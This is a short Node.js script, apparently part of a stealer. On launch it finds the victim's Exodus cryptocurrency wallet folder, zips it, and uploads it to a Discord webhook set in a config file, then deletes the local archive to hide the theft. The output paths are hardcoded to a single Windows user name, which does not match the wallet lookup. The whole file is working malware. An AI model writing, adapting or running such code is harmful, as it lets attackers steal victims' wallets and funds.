const AdmZip = require("adm-zip");
const Webhook = require("discord-webhook-node").Webhook;
const fs = require("fs");
const username = process.env.USERNAME;
const config = require("../config.json");

(async () => {
  const path = `C:\\Users\\${username}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (!fs.existsSync(path)) return;
  const zip = new AdmZip();
  zip.addLocalFolder(path);
  zip.writeZip(`C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`);
  await new Webhook(config.webhook).sendFile(
    `C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`
  );
  fs.unlinkSync(`C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`);
})();
